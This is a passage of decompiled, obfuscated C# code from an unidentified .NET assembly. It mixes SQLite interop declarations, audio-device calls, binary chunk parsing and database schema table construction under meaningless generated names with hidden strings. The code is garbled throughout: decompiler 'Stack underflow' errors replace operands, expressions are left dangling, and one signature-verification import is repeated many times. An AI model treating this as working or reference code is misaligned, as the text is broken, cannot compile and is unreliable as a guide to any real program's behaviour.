				_ = ((global::_0016._0002<global::_0018._0006>)/*Error near IL_000f: Stack underflow*/)._0001;
				global::_0018._0006 obj = ((List<global::_0018._0006>)/*Error near IL_0016: Stack underflow*/)[(int)/*Error near IL_0016: Stack underflow*/];
				obj._0001 = new global::_000E._0001[obj._0004 - obj._0003 + 1];
				_0099_0002._0010_0006(_0002, obj._0003, obj._0001, 0, obj._0001.Length);
			}
			((global::_0016._0002<global::_0018._0006>)P_1)._0001.RemoveAt(((global::_0016._0002<global::_0018._0006>)P_1)._0001.Count - 1);
		}

		static bool _0001(global::_0001._0082 _0002, IntPtr P_1)
		{
			//IL_00a0: Incompatible stack heights: 0 vs 2
			//IL_00aa: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._0099_0005;
			IntPtr intPtr = ((global::_0001._0082)/*Error near IL_000f: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_00aa: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_001b: Stack underflow*/ != 0)
			{
				return true;
			}
			IntPtr intPtr2 = IntPtr.Zero;
			try
			{
				intPtr2 = _0018._0001(_0002._0001);
				global::_0017._0084._001D obj = _0002._0001();
				_0002._0001 = _0002._0001;
				_0002._0001 = _0018._0001(P_1, intPtr2, ref obj, IntPtr.Zero, _0002._0001);
				return _0090_0002._0099_0005(_0002._0001, IntPtr.Zero);
			}
			finally
			{
				if (_0090_0002._0099_0005(intPtr2, IntPtr.Zero))
				{
					_0018._0001(intPtr2);
					intPtr2 = IntPtr.Zero;
				}
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		unsafe static int _0001(global::_0002._0019 P_0)
		{
			//IL_0018: Incompatible stack heights: 0 vs 2
			//IL_001b: Incompatible stack heights: 0 vs 3
			//IL_0022: Incompatible stack heights: 0 vs 1
			_ = _0018_0005._0002_000F;
			_ = ref ((global::_0002._0019)/*Error near IL_000c: Stack underflow*/)._0002;
			_ = 0;
			int num = ((global::_0002._0019)/*Error near IL_0014: Stack underflow*/)._0002;
			/*Error near IL_0022: Stack underflow*/(ref *(int*)/*Error near IL_0022: Stack underflow*/, (int)/*Error near IL_0022: Stack underflow*/, num);
			return (int)/*Error near IL_0017: Stack underflow*/;
		}

		static SortedList<string, string> _0001(global::_0017._0080 _0002, string _0003, bool _0004)
		{
			//IL_00aa: Incompatible stack heights: 0 vs 1
			//IL_00b6: Incompatible stack heights: 0 vs 1
			new DbConnectionStringBuilder();
			DbConnectionStringBuilder dbConnectionStringBuilder;
			if (6u != 0)
			{
				dbConnectionStringBuilder = (DbConnectionStringBuilder)/*Error near IL_00b0: Stack underflow*/;
			}
			((DbConnectionStringBuilder)/*Error near IL_0017: Stack underflow*/).ConnectionString = _0003;
			SortedList<string, string> sortedList = new SortedList<string, string>(StringComparer.OrdinalIgnoreCase);
			foreach (string key in dbConnectionStringBuilder.Keys)
			{
				object obj = dbConnectionStringBuilder[key];
				string value = null;
				if (obj is string)
				{
					value = (string)obj;
				}
				else
				{
					if (_0004)
					{
						throw new ArgumentException(_0080._0014._0001(107359755), key);
					}
					if (obj != null)
					{
						value = obj.ToString();
					}
				}
				sortedList.Add(key, value);
			}
			return sortedList;
		}

		static void _0001(object _0002, float _0003, IntPtr _0004)
		{
			//IL_000a: Invalid comparison between Unknown and F4
			//IL_0094: Incompatible stack heights: 0 vs 1
			//IL_009e: Incompatible stack heights: 0 vs 1
			//IL_00a8: Incompatible stack heights: 0 vs 1
			if (!((float)/*Error near IL_000c: Stack underflow*/ >= 0f))
			{
				_0080._0014._0001(107388827);
				_0080._0014._0001(107388818);
				throw new ArgumentOutOfRangeException((string?)/*Error near IL_0025: Stack underflow*/, (string?)/*Error near IL_0025: Stack underflow*/);
			}
			if (_0003 > 1f)
			{
				throw new ArgumentOutOfRangeException(_0080._0014._0001(107388827), _0080._0014._0001(107388818));
			}
			int num = (int)(_0003 * 65535f) + ((int)(_0003 * 65535f) << 16);
			_0091_0002._009C_0005(_0002);
			MmResult mmResult;
			try
			{
				mmResult = _0018._0001(_0004, num);
			}
			finally
			{
				_0091_0002._009D_0005(_0002);
			}
			_0018._0001(mmResult, _0080._0014._0001(107360242));
		}

		static global::_0017._0017 _0001(int _0002, int _0003, int _0004)
		{
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 1
			_0018._0001((int)/*Error near IL_000b: Stack underflow*/, (int)/*Error near IL_000b: Stack underflow*/, (int)/*Error near IL_000b: Stack underflow*/);
			return new global::_0017._0017(128 + _0003 - 1, _0004, _0002);
		}

		static void _0001(global::_0018._0004 _0002, float P_1)
		{
			//IL_0019: Invalid comparison between Unknown and I4
			//IL_0077: Incompatible stack heights: 0 vs 1
			//IL_007d: Incompatible stack heights: 0 vs 1
			//IL_0087: Incompatible stack heights: 0 vs 1
			if (((global::_0018._0004)/*Error near IL_0007: Stack underflow*/)._0001 != 0)
			{
				_ = ((global::_0018._0004)/*Error near IL_0011: Stack underflow*/)._0001.Count;
				int num = _0002._0001;
				if ((int)/*Error near IL_001b: Stack underflow*/ <= num)
				{
					_0002._0001.Add(P_1);
				}
				else if (_0002._0002 < _0002._0001)
				{
					_0002._0001[_0002._0002] = P_1;
				}
				_0002._0002++;
				_0002._0002 %= _0002._0001;
				global::_0008._009D(_0002);
			}
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_compileoption_used")]
		static extern int _0001(IntPtr _0002);

		static global::_0005._0003 _0001(global::_0012._0005 _0002, bool P_1)
		{
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			global::_0005._0003 obj = null;
			try
			{
				obj = _0018._0001(_0003: ((global::_0012._0005)/*Error near IL_000c: Stack underflow*/)._0001, _0002: (byte)/*Error near IL_0011: Stack underflow*/ != 0);
				if (obj != null)
				{
					_0002._0001++;
					return obj;
				}
				return obj;
			}
			catch (EndOfStreamException)
			{
				return obj;
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0006._0004 _0002, BinaryWriter P_1)
		{
			//IL_00a3: Incompatible stack heights: 0 vs 1
			//IL_00a9: Incompatible stack heights: 0 vs 1
			//IL_00b3: Incompatible stack heights: 0 vs 1
			if (((global::_0006._0004)/*Error near IL_000a: Stack underflow*/)._0001 != null)
			{
				_0018._0001(((global::_0006._0004)/*Error near IL_0019: Stack underflow*/)._0001);
				int num = ((Array)/*Error near IL_001f: Stack underflow*/).Length;
				_009E_0002._007E_001B_0006(P_1, 0, SeekOrigin.End);
				if (global::_0012._007E_0090_0002(_0005_0003._007E_0081_0006(P_1)) % 2 == 1)
				{
					_0084_0003._007E_007F_0007(P_1, 0);
				}
				_0083._007E_000E_0004(P_1, _0018._0001(_0002._0001), 0, num);
				_009E_0002._007E_001B_0006(P_1, 4, SeekOrigin.Begin);
				_009D_0002._007E_0016_0006(P_1, (int)(global::_0012._007E_0090_0002(_0005_0003._007E_0081_0006(P_1)) - 8));
			}
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_column_text16_interop")]
		static extern IntPtr _0001(IntPtr _0002, int _0003, ref int _0004);

		static global::_0017._0084._001D _0001(global::_0001._0082 _0002, global::_0013._0019 P_1)
		{
			//IL_0445: Incompatible stack heights: 0 vs 1
			//IL_044b: Incompatible stack heights: 0 vs 1
			//IL_0451: Incompatible stack heights: 0 vs 1
			((global::_0001._0082)/*Error near IL_000a: Stack underflow*/)._0001 = default(global::_0017._0084._001D);
			((global::_0001._0082)/*Error near IL_001a: Stack underflow*/)._0001._0001 = global::_0001._0082._0001;
			if ((int)/*Error near IL_002e: Stack underflow*/ != 0)
			{
				_0002._0001._0001 = P_1._0001;
				_0002._0001._0001 = P_1._0002;
				_0002._0001._0001 = P_1._0001;
				_0002._0001._0001 = P_1._0001;
				_0002._0001._0001 = P_1._0002;
				_0002._0001._0001 = P_1._0001;
				_0002._0001._0001 = P_1._0003;
				_0002._0001._0001 = P_1._0001;
				_0002._0001._0001 = P_1._0004;
				_0002._0001._0001 = P_1._0001;
				_0002._0001._0001 = P_1._0001;
				_0002._0001._0001 = P_1._0001;
				_0002._0001._0001 = P_1._0001;
				_0002._0001._0001 = P_1._0005;
				_0002._0001._0001 = P_1._0006;
				_0002._0001._0001 = P_1._0007;
				_0002._0001._0001 = P_1._0008;
				_0002._0001._0001 = P_1._0001;
				_0002._0001._0001 = P_1._0002;
				_0002._0001._0001 = P_1._0001;
				_0002._0001._0001 = P_1._0002;
				_0002._0001._0001 = P_1._0003;
			}
			else
			{
				_0002._0001._0001 = _0002._0001;
				_0002._0001._0001 = _0002._0002;
				_0002._0001._0001 = _0002._0001;
				_0002._0001._0001 = _0002._0001;
				_0002._0001._0001 = _0002._0002;
				_0002._0001._0001 = _0002._0001;
				_0002._0001._0001 = _0002._0003;
				_0002._0001._0001 = _0002._0001;
				_0002._0001._0001 = _0002._0004;
				_0002._0001._0001 = _0002._0001;
				_0002._0001._0001 = _0002._0001;
				_0002._0001._0001 = _0002._0001;
				_0002._0001._0001 = _0002._0001;
				_0002._0001._0001 = _0002._0005;
				_0002._0001._0001 = _0002._0006;
				_0002._0001._0001 = _0002._0007;
				_0002._0001._0001 = _0002._0008;
				_0002._0001._0001 = _0002._0001;
				_0002._0001._0001 = _0002._0002;
				_0002._0001._0001 = _0002._0001;
				_0002._0001._0001 = _0002._0002;
				_0002._0001._0001 = _0002._0003;
			}
			return _0002._0001;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_libversion_number")]
		static extern int _0001();

		unsafe static MmResult _0001([Out] global::_0017._0008._0003 _0002, global::_0005._0005 _0003, ref IntPtr _0004, global::_000E._000E _0005, int P_4)
		{
			//IL_004f: Incompatible stack heights: 0 vs 1
			//IL_0056: Incompatible stack heights: 0 vs 1
			//IL_0059: Incompatible stack heights: 0 vs 1
			_ = ((global::_000E._000E)/*Error near IL_0056: Stack underflow*/).Strategy;
			if ((int)/*Error near IL_0006: Stack underflow*/ == 0)
			{
				return _0018._0001(_0003: _0099._008E_0004(P_4), _0004: _0003, _0005: _0002, _0006: IntPtr.Zero, _0002: out *(IntPtr*)/*Error near IL_0025: Stack underflow*/, _0007: global::_0017._0008._0001._0002);
			}
			return _0018._0001(out _0004, _0099._008E_0004(P_4), _0003, _0005.Handle, IntPtr.Zero, global::_0017._0008._0001._0004);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static global::_0018._0003 _0001(global::_0017._0006 P_0)
		{
			//IL_0049: Incompatible stack heights: 0 vs 2
			//IL_0050: Incompatible stack heights: 0 vs 1
			//IL_0053: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._0099_0005;
			IntPtr intPtr = ((global::_0017._0006)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0050: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				return new global::_0018._0003(((global::_0017._0006)/*Error near IL_001c: Stack underflow*/)._0001, 0, _001D._0001._0007);
			}
			return new global::_0018._0003(_0099._008E_0004(P_0.DeviceNumber), 0, _001D._0001._0006);
		}

		static Type _0001(DbType _0002)
		{
			//IL_000a: Incompatible stack heights: 0 vs 2
			_ = global::_0001._001A._0002;
			return (Type)((object[])/*Error near IL_0008: Stack underflow*/)[/*Error near IL_0008: Stack underflow*/];
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0010._0019 P_0)
		{
			//IL_0031: Incompatible stack heights: 0 vs 2
			//IL_0038: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			((global::_0010._0019)/*Error near IL_000c: Stack underflow*/)._0001._0001(ref global::_0010._0019._0002, _001F._0017._0019, IntPtr.Zero, out var obj);
			/*Error near IL_003f: Stack underflow*/((int)/*Error near IL_003f: Stack underflow*/);
			P_0._0001 = new _0080._0011(obj as global::_0006._0014);
		}

		static void _0001(Stream _0002, global::_0001._0015 P_1)
		{
			//IL_023a: Incompatible stack heights: 0 vs 1
			//IL_0240: Incompatible stack heights: 0 vs 1
			//IL_0246: Incompatible stack heights: 0 vs 1
			((global::_0001._0015)/*Error near IL_000c: Stack underflow*/)._0001 = -1L;
			((global::_0001._0015)/*Error near IL_0017: Stack underflow*/)._0001 = null;
			List<global::_0004._000E> list = new List<global::_0004._000E>();
			((global::_0001._0015)/*Error near IL_0026: Stack underflow*/)._0001 = list;
			P_1._0002 = 0L;
			BinaryReader binaryReader = new BinaryReader(_0002);
			_0018._0001(binaryReader, P_1);
			P_1._0003 = _008A_0002._007E_0093_0005(binaryReader);
			if (global::_001A._007E_001D_0003(binaryReader) != _0018._0001(_0080._0014._0001(107388080)))
			{
				throw new FormatException(_0080._0014._0001(107360217));
			}
			if (P_1._0002)
			{
				_0018._0001(binaryReader, P_1);
			}
			int num = _0018._0001(_0080._0014._0001(107360140));
			int num2 = _0018._0001(_0080._0014._0001(107388039));
			long num3 = _0008_0003._0087_0006(P_1._0003 + 8, global::_0012._007E_0090_0002(_0002));
			while (global::_0012._007E_0091_0002(_0002) <= num3 - 8)
			{
				int num4 = global::_001A._007E_001D_0003(binaryReader);
				uint num5 = _008A_0002._007E_0093_0005(binaryReader);
				if (num4 == num)
				{
					P_1._0001 = global::_0012._007E_0091_0002(_0002);
					if (!P_1._0002)
					{
						P_1._0002 = num5;
					}
					_007F_0002._007E_0083_0005(_0002, _0002.Position + num5);
					continue;
				}
				if (num4 == num2)
				{
					if (num5 > int.MaxValue)
					{
						throw new InvalidDataException(_0008_0002._0007_0005(_0080._0014._0001(107360131), int.MaxValue));
					}
					P_1._0001 = _0018._0001(binaryReader, (int)num5);
					continue;
				}
				if (num5 > global::_0012._007E_0090_0002(_0002) - global::_0012._007E_0091_0002(_0002))
				{
					if (!P_1._0001)
					{
					}
					break;
				}
				if (P_1._0003)
				{
					if (num5 > int.MaxValue)
					{
						throw new InvalidDataException(_0008_0002._0007_0005(_0080._0014._0001(107360066), int.MaxValue));
					}
					P_1._0001.Add(_0018._0001((int)num5, _0002, num4));
				}
				_007F_0002._007E_0083_0005(_0002, _0002.Position + num5);
			}
			if (P_1._0001 == null)
			{
				throw new FormatException(_0080._0014._0001(107360029));
			}
			if (P_1._0001 == -1)
			{
				throw new FormatException(_0080._0014._0001(107359432));
			}
		}

		static bool _0001(int _0002, global::_0017._007F._0007 P_1)
		{
			//IL_0054: Incompatible stack heights: 0 vs 1
			//IL_0057: Incompatible stack heights: 0 vs 2
			//IL_005a: Incompatible stack heights: 0 vs 1
			_ = ((global::_0017._007F._0007)/*Error near IL_0007: Stack underflow*/)._0001;
			int num = ((global::_0017._007F._0007)/*Error near IL_000e: Stack underflow*/)._000E;
			((short[])/*Error near IL_0010: Stack underflow*/)[num] = 0;
			((global::_0017._007F._0007)/*Error near IL_0017: Stack underflow*/)._0002[P_1._000E++] = (byte)_0002;
			P_1._0001._0001[_0002]++;
			return P_1._000E >= 16384;
		}

		static void _0001(global::_0010._0010 P_0)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			_0018._0001(((global::_0010._0010)/*Error near IL_0007: Stack underflow*/)._0001);
			_0080._0014._0001(107359411);
			_0018._0001((MmResult)/*Error near IL_0015: Stack underflow*/, (string)/*Error near IL_0015: Stack underflow*/);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static string _0001(string _0002, _0080._0017 _0003)
		{
			//IL_0046: Incompatible stack heights: 0 vs 2
			//IL_004d: Incompatible stack heights: 0 vs 1
			_ = global::_0002._007E_000F;
			_008F_0003._008C_0007();
			_0080._0014._0001(107359362);
			string obj2 = _0018._0001(_0004: new object[3]
			{
				SQLiteException._0001(_0003),
				_008F._001D_0004(),
				_0002
			}, _0002: (IFormatProvider)/*Error near IL_003b: Stack underflow*/, _0003: (string)/*Error near IL_003b: Stack underflow*/);
			return /*Error near IL_0040: Stack underflow*/(obj2);
		}

		static _001B._0003 _0001(_001E._0004 _0002, int P_1)
		{
			//IL_0025: Incompatible stack heights: 0 vs 2
			//IL_0028: Incompatible stack heights: 0 vs 2
			//IL_002f: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			_ = ((_001E._0004)/*Error near IL_000c: Stack underflow*/)._0001;
			((global::_0013._0005)/*Error near IL_002f: Stack underflow*/)._0001((int)/*Error near IL_002f: Stack underflow*/, out int num, out int num2, out int num3);
			/*Error near IL_001b: Stack underflow*/((int)/*Error near IL_001b: Stack underflow*/);
			return new _001B._0003(num, num2, num3);
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, EntryPoint = "sqlite3_result_error16")]
		static extern void _0001(IntPtr _0002, string _0003, int _0004);

		static void _0001(int _0002, global::_0017._007F._000F P_1)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 1
			_0018._0001((int)/*Error near IL_001c: Stack underflow*/, (global::_0017._007F._000F)/*Error near IL_001c: Stack underflow*/);
			_0018._0001(_0002 >> 16, P_1);
		}

		static DataTable _0001(global::_0017._0080 _0002, string _0003, string _0004, string P_3)
		{
			//IL_0b0d: Incompatible stack heights: 0 vs 1
			//IL_0b17: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107359381);
			new DataTable((string?)/*Error near IL_0b17: Stack underflow*/);
			DataTable dataTable = (DataTable)/*Error near IL_0b1d: Stack underflow*/;
			_0001_0005._007E_008A_000E(dataTable, _008F_0003._008B_0007());
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362308), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362799), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362814), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362765), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359336), _0091._0080_0004(typeof(Guid).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359351), _0091._0080_0004(typeof(long).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362780), _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359298), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359273), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359284), _0091._0080_0004(typeof(long).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359235), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359250), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359717), _0091._0080_0004(typeof(Guid).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359736), _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359703), _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359670), _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359645), _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359592), _0091._0080_0004(typeof(long).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359567), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359570), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359541), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359516), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107358947), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362738), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107358922), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107358933), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107358884), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107358899), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107358850), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107358869), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107358816), _0091._0080_0004(typeof(bool).TypeHandle));
			global::_0008._007E_0011_0002(dataTable);
			if (global::_001C._0096_0003(_0003))
			{
				_0003 = _0080._0014._0001(107401775);
			}
			string text = ((_009D_0003._009D_0007(_0003, _0080._0014._0001(107401766), StringComparison.OrdinalIgnoreCase) == 0) ? _0080._0014._0001(107362630) : _0080._0014._0001(107362683));
			global::_0010._001C obj = new global::_0010._001C(_0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107358839), new object[2] { _0003, text }), _0002);
			try
			{
				_0014 obj2 = _0018._0001(obj);
				try
				{
					while (global::_001B._007E_008F_0003(obj2))
					{
						if (!global::_001C._0096_0003(_0004) && _009D_0003._009D_0007(_0004, _009E_0003._007E_0001_0008(obj2, 2), StringComparison.OrdinalIgnoreCase) != 0)
						{
							continue;
						}
						try
						{
							global::_0010._001C obj3 = new global::_0010._001C(_0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107358738), new object[2]
							{
								_0003,
								_009E_0003._007E_0001_0008(obj2, 2)
							}), _0002);
							try
							{
								_0014 obj4 = _0018._0001(CommandBehavior.SchemaOnly, obj3);
								try
								{
									DataTable dataTable2 = _0018._0001(obj4, true, true);
									try
									{
										IEnumerator enumerator = _0014_0005._007E_009B_000E(_0006_0005._007E_008F_000E(dataTable2));
										try
										{
											while (global::_001B._007E_0086_0003(enumerator))
											{
												DataRow dataRow = (DataRow)_0083_0003._007E_001D_0007(enumerator);
												if (_009D_0003._009D_0007(global::_0002._007E_0006(_0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.ColumnName)), P_3, StringComparison.OrdinalIgnoreCase) == 0 || P_3 == null)
												{
													DataRow dataRow2 = _0005_0005._007E_008E_000E(dataTable);
													_0083_0004._007E_0093_0008(dataRow2, _0080._0014._0001(107359670), _0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.NumericPrecision));
													_0083_0004._007E_0093_0008(dataRow2, _0080._0014._0001(107359645), _0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.NumericScale));
													_0083_0004._007E_0093_0008(dataRow2, _0080._0014._0001(107362814), _009E_0003._007E_0001_0008(obj2, 2));
													_0083_0004._007E_0093_0008(dataRow2, _0080._0014._0001(107362765), _0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.ColumnName));
													_0083_0004._007E_0093_0008(dataRow2, _0080._0014._0001(107362308), _0003);
													_0083_0004._007E_0093_0008(dataRow2, _0080._0014._0001(107362780), _0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.ColumnOrdinal));
													_0083_0004._007E_0093_0008(dataRow2, _0080._0014._0001(107359298), _0006_0004._007E_0010_0008(dataRow, SchemaTableOptionalColumn.DefaultValue) != DBNull.Value);
													_0083_0004._007E_0093_0008(dataRow2, _0080._0014._0001(107359273), _0006_0004._007E_0010_0008(dataRow, SchemaTableOptionalColumn.DefaultValue));
													_0083_0004._007E_0093_0008(dataRow2, _0080._0014._0001(107359235), _0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.AllowDBNull));
													_0083_0004._007E_0093_0008(dataRow2, _0080._0014._0001(107359250), _0097_0003._007E_0096_0007(global::_0002._007E_0006(_0006_0004._007E_0010_0008(dataRow, _0080._0014._0001(107359181))), _008F_0003._008B_0007()));
													_0083_0004 obj5 = _0083_0004._007E_0093_0008;
													string text2 = _0080._0014._0001(107358850);
													DbType dbType = (DbType)_0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.ProviderType);
													SQLiteConnectionFlags sQLiteConnectionFlags = _0002._0003;
													obj5(dataRow2, text2, _0097_0003._007E_0096_0007(global::_0002._007E_0006(_0018._0001(sQLiteConnectionFlags, dbType, _0002)), _008F_0003._008B_0007()));
													_0083_0004._007E_0093_0008(dataRow2, _0080._0014._0001(107359736), _0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.ColumnSize));
													_0083_0004._007E_0093_0008(dataRow2, _0080._0014._0001(107362799), _0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.BaseSchemaName));
													_0083_0004._007E_0093_0008(dataRow2, _0080._0014._0001(107358899), _0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.IsKey));
													_0083_0004._007E_0093_0008(dataRow2, _0080._0014._0001(107358869), _0006_0004._007E_0010_0008(dataRow, SchemaTableOptionalColumn.IsAutoIncrement));
													_0083_0004._007E_0093_0008(dataRow2, _0080._0014._0001(107362738), _0006_0004._007E_0010_0008(dataRow, _0080._0014._0001(107359196)));
													_0083_0004._007E_0093_0008(dataRow2, _0080._0014._0001(107358816), _0006_0004._007E_0010_0008(dataRow, SchemaTableColumn.IsUnique));
													_0007_0005._007E_0090_000E(_0006_0005._007E_008F_000E(dataTable), dataRow2);
												}
											}
										}
										finally
										{
											if (enumerator is IDisposable disposable)
											{
												global::_0008._007E_0098(disposable);
											}
										}
									}
									finally
									{
										if (dataTable2 != null)
										{
											global::_0008._007E_0098(dataTable2);
										}
									}
								}
								finally
								{
									if (obj4 != null)
									{
										global::_0008._007E_0098(obj4);
									}
								}
							}
							finally
							{
								if (obj3 != null)
								{
									global::_0008._007E_0098(obj3);
								}
							}
						}
